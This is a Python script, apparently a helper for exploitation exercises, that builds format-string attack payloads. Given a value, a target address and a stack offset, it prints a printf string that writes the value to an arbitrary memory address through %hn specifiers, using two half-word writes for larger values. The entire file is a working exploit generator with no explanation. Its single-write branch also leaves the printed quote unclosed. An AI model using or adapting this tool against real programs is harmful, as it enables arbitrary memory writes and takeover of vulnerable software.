#!/usr/bin/env python
import struct
import sys

def hexify(hexstr):
    hexstr=padder(hexstr)
    return  "\\x" + hexstr[6:8] + "\\x" + hexstr[4:6] + "\\x" + hexstr[2:4] + "\\x" + hexstr[0:2]
def hex2int(hexnum):
    return int(hexnum,16)
def int2hex(intnum):
    return hex(intnum)[2:]
def padder(string):
    delta = 8 - len(string)
    if(delta==0): 
        return string
    if(delta < 0):
        return string[-8:]
    else:
        if(delta > 0):
            return "0"*delta + string

if(len(sys.argv) < 4):
    print("usage:\n What_to_write_hex where_to_write_hex offset_in_stack")
    exit()

toWrite=sys.argv[1]
where=sys.argv[2]
offset=int(sys.argv[3])

if toWrite.startswith("0x"):
    toWrite=toWrite[2:]

if len(toWrite) < 4 or hex2int(toWrite) < 2<<15:
    #no need to split in 2
    value=hex2int(toWrite)
    output="printf '" + str(hexify(where)) + "%%" + str(value) + "c%%" + str(offset) + "$hn"
else:
    littleValue=hex2int(toWrite[0:4])
    bigValue=hex2int(toWrite[4:8])
    swap=True
    if(bigValue<littleValue):
        tmp=bigValue
        bigValue=littleValue
        littleValue=tmp
        swap=False
    output="printf '"
    output+= str(hexify(where))
    output+= str(hexify(int2hex(int(where,16)+2)))
    output+="%%" + str(littleValue-8) + "c%%" + ( str(offset +1) if swap else str(offset) ) + "$hn"
    output+="%%" + str(bigValue - littleValue) + "c%%" + ( str(offset) if swap else str(offset+1) ) + "$hn"
    output+="'"
print(output)
